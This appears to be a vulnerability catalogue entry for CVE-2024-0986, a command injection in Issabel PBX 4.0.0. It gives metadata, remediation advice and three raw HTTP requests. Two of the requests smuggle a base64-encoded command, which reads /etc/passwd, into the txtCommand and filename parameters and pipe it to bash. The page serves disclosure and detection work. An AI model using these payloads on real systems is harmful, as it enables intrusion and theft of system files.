---
layout: post
cve_id: CVE-2024-0986
title: Issabel Authenticated - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-0986.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-0986.yaml
snort2_rule: N/A
snort3_rule: N/A
author: eunji
severity: medium
impact: 'Authenticated administrators can inject and execute arbitrary OS commands
  remotely via the Asterisk CLI, potentially gaining full control over the Issabel
  PBX system.

  '
remediation: 'Update Issabel PBX to a version newer than 4.0.0 that addresses this
  command injection vulnerability.

  '
reference:
- https://github.com/issabel-org/issabel/issues
- https://vuldb.com/?ctiid.252251
- https://vuldb.com/?id.252251
- https://www.vicarius.io/vsociety/posts/issabel-authenticated-remote-code-execution-cve-2024-0986
- https://nvd.nist.gov/vuln/detail/CVE-2024-0986
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L
  cvss-score: 4.7
  cve-id: CVE-2024-0986
  cwe-id: CWE-78
  epss-score: 0.8327
  epss-percentile: 0.99241
  cpe: cpe:2.3:a:issabel:pbx:4.0.0:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: issabel
  product: pbx
  fofa-query: title="issabel"
tags:
- cve
- cve2024
- isssabel
- authenticated
- rce
- asterisk
- vuln
---

## üîç Vulnerability Description
A vulnerability was found in Issabel PBX 4.0.0. It has been rated as critical. This issue affects some unknown processing of the file /index.php?menu=asterisk_cli of the component Asterisk-Cli. The manipulation of the argument Command leads to os command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252251. NOTE- The vendor was contacted early about this disclosure but did not respond in any way.


## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.17
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
input_user=RFguVb&input_pass=1R7cSeXQ&submit_login=
```

```nohighlight
POST /index.php?menu=asterisk_cli HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Connection: close
Content-Length: 137
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
txtCommand=xmldoc+dump+%2Fvar%2Fwww%2Fbackup%2Fx%7C%7Becho%2CY2F0IC4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q%3D%7D%7C%7Bbase64%2C-d%7D%7Cbash
```

```nohighlight
GET /modules/backup_restore/restore.php?filename=x%7C%7Becho,Y2F0IC4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=%7D%7C%7Bbase64,-d%7D%7Cbash HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

